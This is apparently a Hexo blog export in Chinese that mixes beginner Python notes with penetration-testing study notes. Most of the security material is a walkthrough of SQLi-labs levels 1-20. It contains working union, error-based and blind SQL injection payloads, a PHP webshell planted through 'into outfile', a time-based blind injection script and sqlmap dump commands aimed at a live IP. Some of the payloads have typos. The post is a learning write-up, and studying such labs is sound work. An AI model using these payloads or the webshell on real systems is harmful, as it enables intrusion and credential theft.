<p>修改之后：</p>
<p>发现python真的好坑（有点无语），对于对齐和空格有着严格的要求</p>
<p>比如没有遵守就会出现以下画面和英文提示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IndentationError: unindent does not match any outer indentation level</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019031210572084.png" alt="问题"></p>
<p>成功找到解决方法，一个是pycharm软件格式化，不过我已经删掉</p>
<p>另外就是用notepad++的视图里显示空格，见文章：<a href="https://blog.csdn.net/hhy_csdn/article/details/82263757">https://blog.csdn.net/hhy_csdn/article/details/82263757</a></p>
<h4 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h4><p>例如，来看一个制作披萨的函数，它需要接受很多配料，但无法预先确定顾客要多少种配料。</p>
<p>下面的函数只有一个形参*toppings,但不管调用语句提供了多少实参，这个形参会将它们统统收入囊中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def make_pizza(*toppings):</span><br><span class="line">	&quot;&quot;&quot;打印顾客点的所有配料。&quot;&quot;&quot;</span><br><span class="line">	print(toppings)</span><br><span class="line">make_pizza(&#39;pepproni&#39;)</span><br><span class="line">make_pizza(&#39;mushrooms&#39;,&#39;green peppers&#39;,&#39;extra cheese&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(142).png"></p>
<p>python中运算优先级顺序为 NOT、AND、OR。</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python_tip</title>
    <url>/2021/07/22/python/python_tip/</url>
    <content><![CDATA[<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>搭建python的编程环境：subline text、pycharm……</p>
<h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>变量，eg：message  =  ‘’Hello World”</p>
<p>​                    print(message)</p>
<p>输出：Hello World，这里我们添加了一个名为message的变量，它指向的值为文本“Hello World”。</p>
<p>在程序中可随时改变变量的值，而python将始终记录变量的最新值。</p>
<p>变量命名条件：</p>
<p>​                        1.只能包含数字、字母和下划线。且开头只能以字母或下划线开头，不能以数字开头。</p>
<p>​                        2.不能包含空格，但可以使用下划线来分隔其中的单词。</p>
<p>​                        3.勿将python关键字和函数名作为变量名。</p>
<p>​                        4.应该简短又具有描述性。</p>
<p>​                        5.数字1和字母l，数字0和字母o要注意区分。</p>
<p>若出现错误时，往往可以见到    Traceback（most recent call most）的解释器告知错误。</p>
<p>字符串，就是一系列字符，用引号括起的都是字符串，单双引号皆可。</p>
<p>“This is a string.”</p>
<p>‘This is a string.’</p>
<p>方法修改字符大小写：变量名.title()，首字母大写</p>
<p>​                                       变量名.upper()，全部大写</p>
<p>​                                        变量名.lower()，全部小写</p>
<p>字符串的组合，引号里加上中括号，eg：</p>
<p>​    <code>first_name = &quot;ada&quot;</code></p>
<p>​    <code>last_name = &quot;lovelace&quot;</code></p>
<p>​    <code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
<p>​    <code>print(full_name)</code></p>
<p>这里的字符串命名为f字符串，f是format（设置格式）的简写。</p>
<p>添加空白：空格、制表符、换行符， /t, /n</p>
<p>删除空白：方法rstrip</p>
<p>同时给多个变量赋值：x，y，z = 0，0，0</p>
<p>常量：在代码中，要指出应将特定的变量视为常量，可将其字母全部大写。</p>
<p>注释：句子前加#号。</p>
<h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3>]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>goktech</title>
    <url>/2021/01/31/x/goktech/</url>
    <content><![CDATA[<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>1． 信息收集</p>
<p>2． 漏洞挖掘</p>
<p>3． 漏洞利用</p>
<p>4． 输出渗透测试报告</p>
<p>信息收集：</p>
<p>1.</p>
<p>基本信息：</p>
<p>域名信息 : goktech.cn</p>
<p>子域名: 子域名挖掘机.exe  :bbs.goktech.cn   phpinfo,me</p>
<p>ip地址：站长之家</p>
<p>同ip地址的其他网站信息</p>
<p>端口 80(http）443(https)</p>
<p>服务，服务版本（web服务） 同网段的其他服务器信息（c段）</p>
<p>信息泄露，GitHub.com 如qq.com user pass</p>
<p>网站目录：御剑</p>
<p>2.</p>
<p>Os操作系统</p>
<p>Linux windows mac等</p>
<p>3.</p>
<p>  Web中间件（web程序，用来提供网页服务）</p>
<p>类型、版本：iis，apache，nginx，weblogic</p>
<p>4.</p>
<p>  数据库</p>
<p>类型、版本：MySQL、mssql、Oracle、access</p>
<p>5.</p>
<p> 后编的脚本类型</p>
<h3 id="Linux的指令"><a href="#Linux的指令" class="headerlink" title="Linux的指令"></a>Linux的指令</h3><p>ifconfig—查看ip地址</p>
<p>dhclient—重新获取地址</p>
<h4 id="namp-诸神之眼"><a href="#namp-诸神之眼" class="headerlink" title="namp,诸神之眼"></a>namp,诸神之眼</h4><p>#  namp -sS -p 80,443 10.10.10.1 -O</p>
<p>-p 迅速扫描指定的端口</p>
<p>-F  快速扫描100个常用的端口</p>
<p>-r  顺序扫描，按从小到大的顺序进行端口扫描</p>
<p>其他常用选项</p>
<p>-sV 检测服务端软件版本信息</p>
<p>-O  检测操作系统信息</p>
<p>-Pn 禁用namp的主机检测功能</p>
<p>-A 探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p>
<p><img src="http://rongcloud-web.qiniudn.com/docs_demo_rongcloud_logo.png"></p>
]]></content>
      <tags>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/11/05/x/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>SQL labs1-10</title>
    <url>/2020/12/09/sql/1-10/</url>
    <content><![CDATA[<h4 id="Less1：（基于错误的GET单引号字符型注入"><a href="#Less1：（基于错误的GET单引号字符型注入" class="headerlink" title="Less1：（基于错误的GET单引号字符型注入)"></a>Less1：（基于错误的GET单引号字符型注入)</h4><p>解题思路：</p>
<p><strong>方法一，union 联合查询注入</strong></p>
<p>1，首先判断是否存在注入 / ？id=1’   回显错误，去掉 ‘ 发现回显正常，发现是<strong>单引号字符型注入</strong></p>
<p><strong>注意此时因为前面报错可以看到有limit 0,1我们可以知道此处如果需要输出我们union查询出的信息要将前面的位占了，即使前面的输出为不存在。可以看到我是将id的值写为负值，然后将输出的位置就让给了后面我们需要输出的信息，这个技巧在有输出限制的时候十分重要。</strong></p>
<p>2，然后用 order by 判断有几列数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F; ?id &#x3D; 1&#39; order by 3 %23  </span><br></pre></td></tr></table></figure>

<p>回显正常，order by 4 的时候发现回显错误，说明有3 列</p>
<p><strong>我们上面猜测出了字段数为3，但这里输出的只有2个，所以我们union查询要保证字段数一样，不足的补数字（只有mysql可以），或者null。然后第一个是没有输出的，所以我将需要输出的写在了后面两个。</strong></p>
<p>3，将id=1改为一个数据库不存在的id值，如-1，使用union select 1,2,3联合查询语句查看页面是否有显示位。</p>
<p>发现页面先输出了2和3，说明页面有2个显示位</p>
<p>4，然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息</p>
<p>（1） 爆数据库名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata %23</span><br></pre></td></tr></table></figure>

<p><strong>上面的爆出全部的数据库名，\</strong>下面的爆当前的数据库名：****</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() %23</span><br></pre></td></tr></table></figure>

<p>（2） 爆表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure>

<p>（3）爆字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure>

<p>（4）爆内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure>

<p>0x3a 代表十六进制的 ‘ ： ’</p>
<p><strong>方法二：手动报错注入</strong></p>
<p>通过报错回显查询信息</p>
<p>1，爆数据库名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(database()))) --+</span><br></pre></td></tr></table></figure>

<p>2,爆表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) --+</span><br></pre></td></tr></table></figure>

<p>3，4，直接将 <strong>extractvalue(1,concat(0x7e,(……) ) )</strong>  内的内容修改即可。或者用 <strong>updatexml（1，concat(0x7e,(……),1）</strong></p>
<p><img src="/2020/12/09/sql/1-10/%E6%8D%95%E8%8E%B7.PNG"></p>
<h4 id="Less-2：-GET型整型注入）"><a href="#Less-2：-GET型整型注入）" class="headerlink" title="Less 2：(GET型整型注入）"></a>Less 2：(GET型整型注入）</h4><p> 今天成功安装了hackbar的旧版本</p>
<p> 链接地址为：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a> （在火狐浏览器上使用）</p>
<p> 先采用</p>
<p>?id=1 union select 1,2,3–+  发现可行</p>
<p>与之前一样，又在1后加入了分号，出现语法报错</p>
<p>删掉分号，我们修改语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 union select group(schema_name)from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p>查到关于数据库内部数据</p>
<p>接着修改</p>
<p>?id=1 union select group(schema_name)from information_schema.tables where table_schema=’security’–+</p>
<p>这里建议将security修改为16进制，0x开头，英文单词用hackbar里的工具转换为16进制数</p>
<p>之后修改为username</p>
<p>得到username和password字名</p>
<p>然后同第一关一样，我们需要让它出现所有的数据</p>
<p>慢慢来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 union select 1,2,contact_ws(,~username,password)from securiy.uesers--+</span><br></pre></td></tr></table></figure>

<p>同样这里的~使用十六进制，修改为0x7e</p>
<p>我们再加group_concat 函数得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1221 union select 1,2,gruop_concat(concat_ws(0x7e,username,password)from security.users--+</span><br></pre></td></tr></table></figure>

<p>tip:这边加负号是使得id=1失去作用。</p>
<p>最后回显数据，得到链接为：<a href="http://localhost/Less-2/?id=-1221">http://localhost/Less-2/?id=-1221</a> union select 1,2,group_concat(concat_ws(0x7e,username,password))from security.users–+<img src="/2020/12/09/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(11).png"></p>
<h4 id="Less-3-基于错误的get单引号变形字符注入"><a href="#Less-3-基于错误的get单引号变形字符注入" class="headerlink" title="Less-3 (基于错误的get单引号变形字符注入)"></a>Less-3 (基于错误的get单引号变形字符注入)</h4><p>1，输入 id=1 正常，输入id=1’ # 回显错误 ，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id=(‘1’) …，在第一题中id=1‘的后面单引号加上），其它保持不变就行了</p>
<h4 id="Less-4-基于错误的get双引号字符型注入"><a href="#Less-4-基于错误的get双引号字符型注入" class="headerlink" title="Less-4 (基于错误的get双引号字符型注入)"></a>Less-4 (基于错误的get双引号字符型注入)</h4><p>,输入 id =1 回显正常  输入 id =1’ 回显正常  输入 id = 1” 回显错误  说明是 双引号闭合型</p>
<p>输入 id = 1” %23 回显错误  说明还有一个 单括号闭合 </p>
<p>输入 id = 1”) …… 其他不变</p>
<h4 id="Less-5-双注入get单引号字符型注入"><a href="#Less-5-双注入get单引号字符型注入" class="headerlink" title="Less-5(双注入get单引号字符型注入)"></a>Less-5(双注入get单引号字符型注入)</h4><p> 第五关与前四关不同，没有了明显的回显，经过资料查询为布尔盲注（bool）</p>
<p>与之前一样我们先利用基本语句，发现id=1’时报错，存在注入；</p>
<p>之后用order by语句查询到至多只有3行；</p>
<p>但是没有了明显的回显后，我们不能再使用union select 联合查询来寻找我们要的数据；</p>
<p>这个时候就使用新的语句 and left(( select database()),1) 进行试探，或是直接进入MySQL控制台使用语句进行查询更加直观</p>
<p>这是用sqlmap跑的数据图</p>
<p><img src="/2020/12/09/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(12).png"></p>
<p>最后的数据为‘security’   </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20left%20((select%20database()),8)&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure>

<p>这里推荐函数链接：：<a href="https://blog.csdn.net/qq_43573676/article/details/105774162">https://blog.csdn.net/qq_43573676/article/details/105774162</a></p>
<h4 id="Less-6-双注入get双引号字符型注入"><a href="#Less-6-双注入get双引号字符型注入" class="headerlink" title="Less-6 (双注入get双引号字符型注入)"></a>Less-6 (双注入get双引号字符型注入)</h4><p>只用将less 5 中的单引号改为 双引号即可</p>
<h4 id="Less-7-导出文件get字符型注入"><a href="#Less-7-导出文件get字符型注入" class="headerlink" title="Less-7 (导出文件get字符型注入)"></a>Less-7 (导出文件get字符型注入)</h4><p>1，补充：<br>@@basedir ：mysql安装路径</p>
<p>@@datadir ：数据库路径</p>
<p><strong>load_file(file_name)：读取文件并返回该文件的内容作为一个字符串</strong></p>
<p><strong>使用条件：必须有权限读取并且文件可读，必须指定文件完整的路径</strong></p>
<p>2，由于我不是在本地搭载的环境，所以知道具体的数据存放路径，需要去获取绝对路径，</p>
<p>前面知道 本题是 单引号 加双括号 的闭合方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? id&#x3D;-1&#39;)) union select 1,2,@@datadir --+</span><br></pre></td></tr></table></figure>

<p>获取不了 路径</p>
<p>于是去前面的简单的题找个路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Less-2&#x2F;?id&#x3D;-1 union select 1,@@basedir,@@datadir --+</span><br></pre></td></tr></table></figure>

<p>得到路经：<img src="https://img-blog.csdnimg.cn/20190511131738156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>进行文件导入：(这里要用 \ ）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;http:&#x2F;&#x2F;43.247.91.228:84\\var\\lib\\mysql\\www\\123.php&quot;--+</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是：利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖，所以如果第一次上传chao.php，下次在上传chao.php，就是无效命令了，也就是新的chao,php中的内容并不会覆盖，之前的chao.php</strong></p>
<p>然后用菜刀进行连接</p>
<p> 我自己在尝试第七关的时候，发生了很多次失败，导致sql靶场一度搁浅</p>
<p>现在想想错误应该是这几个：</p>
<p>1.没有//，因为遇到转义时需用//才能使得浏览器解析时为我们自己想要的。</p>
<p>2.格式没有完全对，之前借鉴的博客里可能有一些问题（无意冒犯一些大佬）。</p>
<p>3.对于什么是一句话木马没有一点了解，就连工具antsword也是装了很久才成功。</p>
<h4 id="Less-8-布尔型单引号GET盲注"><a href="#Less-8-布尔型单引号GET盲注" class="headerlink" title="Less-8 (布尔型单引号GET盲注)"></a>Less-8 (布尔型单引号GET盲注)</h4><p>1，补充：</p>
<p><strong>（1）盲注分为两类：<br>　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</strong></p>
<p>（2）</p>
<p>–batch ： 让sqlmap自动输入</p>
<p>–dbms mysql   ：指定数据库系统为mysql绕过sqlmap的自动检测</p>
<p>-v 显示 等级（0-6）</p>
<p><strong>方法一 ：用sqlmap 按部就班的</strong> 来，最后一步的payload 为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;43.247.91.228:84&#x2F;Less-8&#x2F;?id&#x3D;2&quot; --dbms mysql --batch -v 1 --dump -D security -T users -C &quot;id,password,username&quot;</span><br></pre></td></tr></table></figure>

<p><strong>方法二： 用脚本进行 盲注</strong> </p>
<p>具体操作 参考 <a href="https://blog.csdn.net/wy_97/article/details/78169623">https://blog.csdn.net/wy_97/article/details/78169623</a> 的详细操作</p>
<p><strong>方法三： 完全可以按照之前方法慢慢来爆破</strong></p>
<h4 id="Less-9-基于时间的GET单引号盲注"><a href="#Less-9-基于时间的GET单引号盲注" class="headerlink" title="Less-9 (基于时间的GET单引号盲注)"></a>Less-9 (基于时间的GET单引号盲注)</h4><p>1，<strong>补充：时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</strong></p>
<p>2，手工注入实在是太麻烦，将手工注入整理一下写出一个脚本 让机器去注入</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">value =<span class="string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@_.-&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((ascii(substr((&#123;0&#125; limit 3,1),&#123;1&#125;,1)) = &#x27;&#123;2&#125;&#x27;),sleep(3),NULL); %23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_length=<span class="string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((length((&#123;0&#125; limit 3,1))=&#123;1&#125; ),sleep(3),NULL); %23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span>(<span class="params">payload</span>):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        url= url_length.format(payload,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        print(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(get_respone(url)):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            print(<span class="string">&quot;[+] length is &#123;0&#125;&quot;</span>.format(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">payload,value,length</span>):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,length):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> value :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            url_data = url.format(payload,n,ord(v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            print(url_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(get_respone(url_data)):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">global</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                data=data+v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                print(<span class="string">&quot;[+] data is &#123;0&#125;&quot;</span>.format(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_respone</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        html = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;......&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">databse_payload =<span class="string">&quot;select  table_name from information_schema.tables where table_schema = database()&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data(databse_payload,value,get_length(databse_payload)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>这个脚本你每次只能查询 一个内容，</strong></p>
<p><strong>需要不断改变 4，5，行中 limit x，1 的 x 的数字去查询，</strong></p>
<p><strong>也需要改变 database_payload 去查询不同的信息</strong></p>
<h4 id="Less-10-基于时间的双引号盲注"><a href="#Less-10-基于时间的双引号盲注" class="headerlink" title="Less-10 (基于时间的双引号盲注)"></a>Less-10 (基于时间的双引号盲注)</h4><p>1，只用将第9题中的单引号改为双引号，其他用脚本注入就好</p>
<p><strong>注意，在脚本的第 4，5中的所有的单引号都改为双引号</strong></p>
<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="sqlmap-post类型注入方法："><a href="#sqlmap-post类型注入方法：" class="headerlink" title="sqlmap post类型注入方法："></a>sqlmap post类型注入方法：</h1><p><strong><em>\</em>方法一：（“-r txt ”方式注入）**</strong></p>
<p>1，先用burp suite 抓包，保存为1.txt文件放在桌面上</p>
<p><img src="https://img-blog.csdnimg.cn/20190523221451758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>2，打开sqlmap</p>
<p>查询数据库名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --dbs</span><br></pre></td></tr></table></figure>

<p>注：-r表示加载一个文件，-p指定参数</p>
<p>之后对应选择输入 ： Y    N     Y</p>
<p>得到：<img src="https://img-blog.csdnimg.cn/20190523221840906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>之后查表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --D skctf_flag --tables</span><br></pre></td></tr></table></figure>

<p>查字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --D database_name -T table_name --columns</span><br></pre></td></tr></table></figure>

<p>查内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --D database_name -T table_name -C column_name --dump</span><br></pre></td></tr></table></figure>

<h5 id="此文大部分方法和内容转载于"><a href="#此文大部分方法和内容转载于" class="headerlink" title="此文大部分方法和内容转载于"></a>此文大部分方法和内容转载于</h5><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/89740401">https://blog.csdn.net/vhkjhwbs/article/details/89740401</a></p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>11-20</title>
    <url>/2021/02/18/sql/11-20/</url>
    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
<p>但是#改成–+却不行</p>
<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
